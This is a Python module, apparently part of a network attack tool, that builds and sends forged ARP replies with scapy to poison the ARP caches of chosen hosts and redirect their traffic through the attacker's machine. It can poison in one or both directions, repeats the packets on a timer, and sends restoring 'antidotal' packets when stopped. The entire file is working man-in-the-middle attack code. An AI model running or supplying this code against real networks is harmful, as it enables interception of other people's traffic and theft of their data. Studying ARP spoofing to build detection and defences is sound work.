from dataclasses import dataclass
from scapy.all import *
from util import Host, Interface
import time

@dataclass
class ARPAttackSettings:
    interface: Interface
    me: Host
    sources: list[Host]
    destinations: list[Host]
    two_way: bool
    initial_packets: int
    seconds_interval: int

class ARPAttack:
    def __init__(self, settings: ARPAttackSettings):
        self.settings = settings
        self.active = False

    def start(self):
        self.active = True
        for _ in range(self.settings.seconds_interval):
            self.send_poisonous_packets()

        while self.active:
            self.send_poisonous_packets()
            time.sleep(self.settings.seconds_interval)

    def stop(self):
        self.active = False
        self.send_antidotal_packets()

    def send_poisonous_packets(self):
        pairs = [(x, y) for x in self.settings.sources for y in self.settings.destinations]

        for source, destination in pairs:
            packet = Ether() / ARP()
            packet[Ether].src = self.settings.me.mac_addr
            packet[Ether].dst = source.mac_addr
            packet[ARP].psrc = destination.ip_addr
            packet[ARP].pdst = source.ip_addr
            packet[ARP].hwsrc = self.settings.me.mac_addr
            packet[ARP].hwdst = source.mac_addr

            sendp(packet, iface=self.settings.interface.name, verbose=0)

        if self.settings.two_way:
            for source, destination in pairs:
                packet = Ether() / ARP()
                packet[Ether].src = self.settings.me.mac_addr
                packet[Ether].dst = destination.mac_addr
                packet[ARP].psrc = source.ip_addr
                packet[ARP].pdst = destination.ip_addr
                packet[ARP].hwsrc = self.settings.me.mac_addr
                packet[ARP].hwdst = destination.mac_addr

                sendp(packet, iface=self.settings.interface.name, verbose=0)

    def send_antidotal_packets(self):
        pairs = [(x, y) for x in self.settings.sources for y in self.settings.destinations]

        for source, destination in pairs:
            packet = Ether() / ARP()
            packet[Ether].src = self.settings.me.mac_addr
            packet[Ether].dst = source.mac_addr
            packet[ARP].psrc = destination.ip_addr
            packet[ARP].pdst = source.ip_addr
            packet[ARP].hwsrc = destination.mac_addr
            packet[ARP].hwdst = source.mac_addr

            sendp(packet, iface=self.settings.interface.name, verbose=0)

        if self.settings.two_way:
            for source, destination in pairs:
                packet = Ether() / ARP()
                packet[Ether].src = self.settings.me.mac_addr
                packet[Ether].dst = destination.mac_addr
                packet[ARP].psrc = source.ip_addr
                packet[ARP].pdst = destination.ip_addr
                packet[ARP].hwsrc = source.mac_addr
                packet[ARP].hwdst = destination.mac_addr

                sendp(packet, iface=self.settings.interface.name, verbose=0)
